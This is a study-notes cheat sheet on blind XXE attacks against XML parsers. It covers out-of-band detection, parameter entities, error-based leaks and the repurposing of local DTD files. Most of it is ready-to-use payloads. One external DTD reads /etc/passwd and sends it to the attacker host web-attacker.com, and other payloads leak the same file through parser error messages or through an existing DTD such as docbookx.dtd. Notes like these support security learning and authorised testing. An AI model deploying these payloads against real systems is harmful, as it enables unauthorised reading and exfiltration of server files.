## Blind XXE
* No returning of values in responses
* Could use out-of-band techniques
* Trigger XML parsing errors

OAST
* <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
* You can use Burp Collaborater to come up with your custom domain then poll the collaborater interactions to see what is being sent to the domain.
* If blocked => can user parameter entities instead
   	* Parameters can only be accessed elsewhere within the DTD
   	* <!ENTITY % myparameterentity "my parameter entity value" >
   	* <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>

Exfiltrating Data Out of Band
* To actually get information, attacker needs to host malicious DTD on system they control and invoke in an in-band payload
* Create an external DTD that can be referenced in an in-band payload
			<!ENTITY % filePlease SYSTEM "file:///etc/passwd">
            <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%filePlease;'>">
            %eval;
            %exfiltrate;
* Also try etc/hostname?
* Then reference the page that contains that XML in the payload

Retrieving Data through error messages
* Trigger a parsing error with an error message containing sensitive info
			<!ENTITY % file SYSTEM "file:///etc/passwd">
            <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
            %eval;
            %error;
            
Repurposing local DTD
* Nested parameter entities are permitted in external DTD's but not internal.
* Loophole in language specs: if DTD hybrid of internal and external declarations, the internal redefines entities in the externa
   	* This relaxes the no-nesting rule
   	* Means you can employ error based XXE attack
* If out-of-band blocked -> external cannot be loaded from remote, needs to be local to application server
* File than happens to exist on local file system
* Look for DTD files and custom entity names to overwrite.
			<!DOCTYPE foo [
                <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
                <!ENTITY % custom_entity '
                    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
                    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
                    &#x25;eval;
                    &#x25;error;
                '>
                %local_dtd;
            ]>       
            
Locating existing DTD to repurpose
* Use payloads of common file structures.
* Once you find some dtd's, look at the entities you could repurpose
			<!DOCTYPE foo [
                <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
                %local_dtd;
            ]>        

